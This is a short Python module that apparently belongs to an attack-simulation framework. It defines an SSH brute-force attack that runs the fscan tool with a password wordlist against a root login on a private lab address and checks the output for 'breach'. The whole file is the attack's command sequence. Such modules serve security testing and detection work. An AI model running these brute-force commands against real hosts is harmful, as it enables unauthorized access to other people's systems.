from attacks import Attack, AttackInfo, AttackOptions


class SSHBruteforceAttackOptions(AttackOptions):
    host = "Target SSH Host"
    port = "Target SSH Port"
    tool = "SSH Bruteforce Tool Path"
    password = "SSH Bruteforce Password File"
    username = "Target SSH Username"

    def _set_defaults(self):
        self.host = "172.18.0.2"
        self.port = "222"
        self.tool = "/root/fscan"
        self.password = "/usr/share/wordlists/fasttrack.txt"
        self.username = "root"


class SSHBruteforceAttack(Attack):
    info = AttackInfo(
        name="info_ssh_bruteforce",
        description="ssh bruteforce")
    options_class = SSHBruteforceAttackOptions

    def run(self):
        tool = self.options.tool
        with self.check_printed("breach"):
            self.exec_commands_on_target([
                f"chmod +x {tool}",
                f"{tool} -h {self.options.host} -m ssh -p {self.options.port} -pwdf {self.options.password} -user {self.options.username}"
            ])
